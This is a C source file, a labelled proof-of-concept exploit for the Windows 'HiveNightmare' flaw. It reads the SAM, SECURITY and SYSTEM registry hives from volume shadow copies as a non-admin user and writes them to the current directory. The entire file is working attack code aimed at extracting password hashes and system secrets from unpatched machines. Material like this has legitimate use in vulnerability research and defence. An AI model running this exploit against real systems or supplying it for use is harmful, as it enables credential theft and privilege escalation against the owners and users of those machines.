// Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
// Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users

#include <windows.h>
#include <stdio.h>

#define NUMBER_SNAPSHOTS 10

BOOL main() {
    const char* pathShadow = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%i\\Windows\\System32\\config\\%s";
    const char* targetFiles[] = {
        "SAM",
        "SECURITY",
        "SYSTEM",
    };


    printf("\n[-] HiveNightmare - dump registry hives as non-admin users\n");

    char* fullPathShadow = (char*)calloc(MAX_PATH, sizeof(char*));
    if (fullPathShadow == NULL) {
        printf("[x] Memory error !\n");
        return TRUE;
    }

    for (int targetFilesNb = 0; targetFilesNb < sizeof(targetFiles) / sizeof(char*); targetFilesNb++) {
        int valideNumberVolune = 1;
        HANDLE hFile = INVALID_HANDLE_VALUE;
        HANDLE hAppend;
        DWORD  dwBytesRead, dwBytesWritten, dwPos;
        BYTE   buff[4096];

        for (; valideNumberVolune < NUMBER_SNAPSHOTS && hFile == INVALID_HANDLE_VALUE; valideNumberVolune++) {
            sprintf_s(fullPathShadow, MAX_PATH, pathShadow, valideNumberVolune, targetFiles[targetFilesNb]);
            hFile = CreateFileA(fullPathShadow, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        }
        if (valideNumberVolune == NUMBER_SNAPSHOTS || hFile == INVALID_HANDLE_VALUE) {
            printf("[x] Could not open %s :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first %i VSS snapshots only - list snapshots with vssadmin list shadows\n", targetFiles[targetFilesNb], NUMBER_SNAPSHOTS);
            return TRUE;
        }

        hAppend = CreateFileA(targetFiles[targetFilesNb], FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hAppend == INVALID_HANDLE_VALUE) {
            printf("[x] Could not write %s - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n", targetFiles[targetFilesNb]);
            return TRUE;
        }
        while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
            && dwBytesRead > 0) {
            dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
            LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
            WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
            UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        }
        CloseHandle(hFile);
        CloseHandle(hAppend);

        printf("\t[-] %s hive written out to current working directory\n", targetFiles[targetFilesNb]);
    }
    free(fullPathShadow);
    printf("\n[*] Assuming no errors, should be able to find hive dump files in current working directory as SAM, SECURITY and SYSTEM\n");
    return FALSE;
}